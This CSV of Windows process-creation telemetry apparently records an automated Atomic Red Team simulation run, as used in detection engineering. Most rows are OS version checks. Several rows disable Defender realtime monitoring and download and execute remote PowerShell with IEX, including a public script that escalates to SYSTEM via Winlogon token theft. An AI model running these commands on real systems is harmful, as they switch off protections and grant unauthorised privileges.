Image,CommandLine,ParentProcess
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-23835"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-3916"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""27421"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pldE6BF.tmp.bat T1574.012  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESE883.tmp"" ""c:\Windows\SystemTemp\k53niatv\CSC431F4E87E964158964C94F3902FC98B.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1564.001 -CheckPrereqs ; Invoke-AtomicTest T1564.001 -GetPrereqs ; Invoke-AtomicTest T1564.001 ; Invoke-AtomicTest T1564.001 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESDF2D.tmp"" ""c:\Windows\SystemTemp\reacj30s\CSC289C668D1063487DB338E968AD62E520.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\reacj30s\reacj30s.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESDB45.tmp"" ""c:\Windows\SystemTemp\za1gmiky\CSCF9EBDAB2B1AB4A03A1E98DA4B43D3ADB.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-17915"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-26458"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""27408"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pldD6D0.tmp.bat T1564.001  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\k53niatv\k53niatv.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESCA2E.tmp"" ""c:\Windows\SystemTemp\3grkdr3o\CSC38F19ED7903481283F13A111BBDF735.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\za1gmiky\za1gmiky.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1070.004 -CheckPrereqs ; Invoke-AtomicTest T1070.004 -GetPrereqs ; Invoke-AtomicTest T1070.004 ; Invoke-AtomicTest T1070.004 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESC05A.tmp"" ""c:\Windows\SystemTemp\fy1tblf1\CSCBFB3D83CF1764BBEB477CAA2E5401A.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\fy1tblf1\fy1tblf1.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,C:\WINDOWS\system32\cmd.exe /c wmic OS Get localdatetime /value,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-6073"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""-6007"" 1>>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" set /p=""27382"" 1>alpuid.altemp""",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO """,C:\Windows\System32\cmd.exe
C:\Windows\System32\conhost.exe,\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,cmd.exe /C C:\WINDOWS\TEMP\pldB898.tmp.bat T1070.004  --use-cleanup,C:\Windows\System32\rphcp.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\3grkdr3o\3grkdr3o.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  Set-ExecutionPolicy Unrestricted ; Set-MpPreference -DisableRealtimeMonitoring $true ; Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force ; IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); Install-AtomicRedTeam -Force -getAtomics ; Invoke-AtomicTest T1564.003 -CheckPrereqs ; Invoke-AtomicTest T1564.003 -GetPrereqs ; Invoke-AtomicTest T1564.003 ; Invoke-AtomicTest T1564.003 -Cleanup ; Set-MpPreference -DisableRealtimeMonitoring $false ,C:\Windows\System32\cmd.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\WINDOWS\SystemTemp\RESAFC0.tmp"" ""c:\Windows\SystemTemp\hvfrrbez\CSC1561C81A62B462BA3E8A831D8E021E7.TMP""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\WINDOWS\SystemTemp\hvfrrbez\hvfrrbez.cmdline""",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Powershell.exe  (Get-packageProvider -name nuget).ProviderPath ,C:\Windows\System32\cmd.exe
C:\Windows\System32\net1.exe,C:\WINDOWS\system32\net1  FILE ,C:\Windows\System32\net.exe
C:\Windows\System32\net.exe,NET  FILE ,C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell.exe  Get-ExecutionPolicy ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""10.0.22"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.2."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""6.0."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""5.1."" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ver """,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2022"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2019"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2016"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2012"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2008"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""Server 2003"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,"wmic  os get Caption,CSDVersion /value ",C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""PowerShellGet"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell  Get-Module -ListAvailable PowerShellGet ,C:\Windows\System32\cmd.exe
C:\Windows\System32\find.exe,"find  ""cleanup"" ",C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe,"C:\WINDOWS\system32\cmd.exe  /S /D /c"" ECHO --use-cleanup """,C:\Windows\System32\cmd.exe
C:\Windows\System32\wbem\WMIC.exe,wmic  OS Get localdatetime /value,C:\Windows\System32\cmd.exe
